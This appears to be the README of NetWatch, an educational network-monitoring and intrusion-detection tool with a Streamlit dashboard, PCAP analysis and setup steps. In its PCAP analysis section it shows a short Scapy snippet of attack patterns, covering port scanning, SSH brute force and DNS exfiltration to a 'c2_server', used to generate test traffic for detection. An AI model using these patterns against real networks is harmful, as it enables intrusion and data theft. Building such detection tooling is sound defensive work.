# NetWatch 🕵️‍♂️

## Educational Notice

### Educational Purpose

This tool is for educational purposes only.

NetWatch is a network monitoring and traffic analysis tool with an interactive Streamlit dashboard, created for educational purposes to help students and security researchers understand network monitoring concepts, traffic analysis, and basic intrusion detection principles.

## ⚠️ Disclaimer

This tool is designed and intended **STRICTLY FOR EDUCATIONAL PURPOSES**. It should only be used in controlled environments where you have explicit permission to monitor the network traffic. Using this tool to monitor networks or devices without authorization may be illegal and unethical.

## 🎯 Features

### Core Features

- Network device discovery using ARP scanning
- Real-time traffic capture and analysis
- Device presence logging and history tracking
- Traffic threshold monitoring
- Suspicious traffic detection and analysis
- Interactive Streamlit dashboard
- PCAP generation with simulated attack patterns

### Analysis Features

- PCAP file analysis with detailed reports
- Interactive web dashboard with real-time updates
- Advanced traffic visualization and charts
- Protocol and port distribution analysis
- Attack pattern recognition
- Data exfiltration detection
- Suspicious behavior monitoring
- Network enumeration tracking

## 🛠️ Technical Components

1. **Device Discovery**: Uses Scapy for ARP-based network scanning
2. **Traffic Capture**: Python-native packet capture and analysis
3. **Interactive Dashboard**: Built with Streamlit
   - Real-time network scanning
   - Traffic capture controls
   - Interactive visualizations
4. **Analysis Features**:
   - Protocol distribution
   - Packet size analysis
   - Top talkers identification
   - Time-series visualization

## 📋 Prerequisites

### System Requirements

- Linux/Unix-based system or macOS
- Python 3.9 or higher
- Root/sudo privileges for packet capture

### Python Dependencies

```python
streamlit==1.37.0  # Interactive dashboard
scapy==2.5.0      # Network packet manipulation
pandas==2.1.0     # Data analysis
plotly==5.17.0    # Interactive visualizations
python-dotenv     # Environment configuration
netifaces         # Network interface detection
```

### Optional System Packages

- tcpdump (for packet capture)
- tshark (for advanced PCAP analysis)
- modern web browser (for dashboard)

### Installation

1. Clone the repository:

```bash
git clone https://github.com/yourusername/netwatch.git
cd netwatch
```

2. Create and activate a virtual environment:

```bash
python -m venv venv
source venv/bin/activate  # On Unix/macOS
# or
.\venv\Scripts\activate  # On Windows
```

3. Install Python dependencies:

```bash
pip install -r requirements.txt
```

4. Install system packages:

```bash
# On Ubuntu/Debian
sudo apt update
sudo apt install tcpdump tshark

# On macOS with Homebrew
brew install tcpdump wireshark
```

## 🚀 Local Usage

### Prerequisites

1. Install Python 3.9 or higher
2. Install required packages:

   ```bash
   pip install -r requirements.txt
   ```

### Running Locally

1. Start the Streamlit dashboard:

   ```bash
   sudo streamlit run netwatch.py
   ```

2. Open your browser to `http://localhost:8501`

### Using the Dashboard

1. **Network Scanning**:

   ```bash
   # Start NetWatch with network scanning
   sudo streamlit run netwatch.py -- --scan
   ```

   - Click 'Scan Network' to discover devices
   - View device details in real-time:

     ```json
     {
       "ip": "192.168.1.100",
       "mac": "00:11:22:33:44:55",
       "hostname": "device.local",
       "first_seen": "2025-04-14T04:20:48",
       "last_seen": "2025-04-14T04:35:35",
       "status": "active"
     }
     ```

1. **Traffic Capture**:

   ```bash
   # Start capture for specific device
   sudo streamlit run netwatch.py -- --capture --target 192.168.1.100
   ```

   - Configure capture settings in `config.json`:

     ```json
     {
       "capture": {
         "duration": 3600,
         "max_size": "1GB",
         "rotate": true,
         "filters": [
           "port 80",
           "port 443",
           "!broadcast"
         ]
       }
     }
     ```

1. **PCAP Analysis**:

   ```bash
   # Analyze existing PCAP file
   streamlit run ui/pcap_analyzer.py -- --pcap captures/traffic.pcap
   ```

   - Generate suspicious traffic for testing:

     ```bash
     python network/generate_suspicious_pcap.py
     ```

   - Example attack patterns:

     ```python
     # Port scanning
     for port in common_ports:
         tcp_scan = IP(dst=target)/TCP(dport=port, flags="S")
     
     # Brute force
     for password in wordlist:
         auth_attempt = IP(dst=target)/TCP(dport=22)/Raw(load=password)
     
     # Data exfiltration
     data_packet = IP(dst=c2_server)/DNS(qd=DNSQR(qname=encoded_data))
     ```

## 🐳 Docker Deployment

### Building the Container

```bash
# Build the Docker image
docker build -t netwatch .
```

```bash
# Run the container
docker run -d \
  --name netwatch \
  --network host \
  --cap-add=NET_ADMIN \
  --cap-add=NET_RAW \
  netwatch
```

## 🍓 Raspberry Pi Deployment

### Setting up Raspberry Pi

1. Install Docker on Raspberry Pi:

   ```bash
   curl -sSL https://get.docker.com | sh
   sudo usermod -aG docker $USER
   ```

2. Clone and deploy NetWatch:

   ```bash
   git clone https://github.com/yourusername/netwatch.git
   cd netwatch
   docker build -t netwatch .
   docker run -d \
     --name netwatch \
     --network host \
     --cap-add=NET_ADMIN \
     --cap-add=NET_RAW \
     netwatch
   ```

3. Access the dashboard:
   - From Raspberry Pi: `http://localhost:8501`
   - From other devices: `http://<raspberry-pi-ip>:8501`

### Remote Access Setup

1. Configure port forwarding on your router:

   - Forward port 8501 to your Raspberry Pi
   - Use a strong password for Streamlit

2. For secure remote access:

   - Set up a VPN server on Raspberry Pi
   - Access through VPN connection
   - Or use SSH tunnel:

     ```bash
     ssh -L 8501:localhost:8501 pi@<raspberry-pi-ip>
     ```

## 📊 Project Structure

```text
netwatch/
├── network/                 # Network operations
│   ├── scanner.py          # Device discovery
│   ├── monitor.py          # Traffic monitoring
│   ├── capture.py          # Packet capture
│   └── generate_suspicious_pcap.py  # Test traffic
├── ui/                     # User interface
│   ├── components.py       # UI components
│   └── pcap_analyzer.py    # PCAP analysis
├── data/                   # Data storage
│   ├── tracked_devices.json    # Device history
│   └── device_history.json     # Activity logs
├── captures/               # PCAP files
│   ├── traffic_*.pcap         # Live captures
│   └── suspicious_traffic.pcap # Test data
├── config/                 # Configuration
│   ├── config.json            # Main settings
│   └── filters.json           # Capture filters
└── reports/                # Analysis output
    ├── traffic/               # Traffic reports
    └── alerts/                # Security alerts
```

### Configuration Files

1. **Main Configuration** (`config/config.json`):

```json
{
  "network": {
    "interface": "auto",
    "scan_interval": 300,
    "exclude_ips": ["127.0.0.1"]
  },
  "capture": {
    "rotate_size": "1GB",
    "max_files": 10,
    "compression": true
  },
  "monitoring": {
    "check_interval": 60,
    "alert_threshold": 1000
  }
}
```

2. **Device Tracking** (`data/tracked_devices.json`):

```json
{
  "devices": [
    {
      "ip": "192.168.1.100",
      "mac": "00:11:22:33:44:55",
      "hostname": "laptop.local",
      "track": true,
      "alerts": true
    }
  ]
}
```

3. **Analysis Output** (`reports/traffic/analysis.json`):

```json
{
  "summary": {
    "total_packets": 1000,
    "duration": 3600,
    "start_time": "2025-04-14T04:20:48",
    "protocols": {
      "TCP": 750,
      "UDP": 200,
      "ICMP": 50
    }
  },
  "alerts": [
    {
      "type": "port_scan",
      "source": "192.168.1.42",
      "time": "2025-04-14T04:30:00",
      "details": "Sequential scan of ports 1-1024"
    }
  ]
}
```

### Data Analysis

The analysis reports include:

- Advanced port scanning detection
- Brute force attack patterns
- Data exfiltration attempts
- DNS tunneling and zone transfers
- Web attack signatures (SQL injection, directory traversal)
- Network enumeration activities
- Protocol and port distribution
- Traffic volume and data usage metrics
- Conversation analysis and top talkers

## 🎓 Educational Value

This tool helps demonstrate:

- Network scanning and device discovery techniques
- Packet capture and analysis
- Traffic monitoring and threshold detection
- Alert system integration
- Shell scripting best practices
- System administration concepts

## 🔒 Security Considerations

When using this tool for educational purposes:

- Always obtain proper authorization
- Use in isolated/controlled environments
- Be aware of privacy implications
- Follow ethical guidelines
- Never use on production networks without permission

## 📝 License

This project is released under the MIT License and is intended for educational purposes only.

## ⚠️ Final Note

This tool is part of an educational curriculum for understanding network monitoring and security concepts. Any use outside of educational purposes is strictly prohibited.
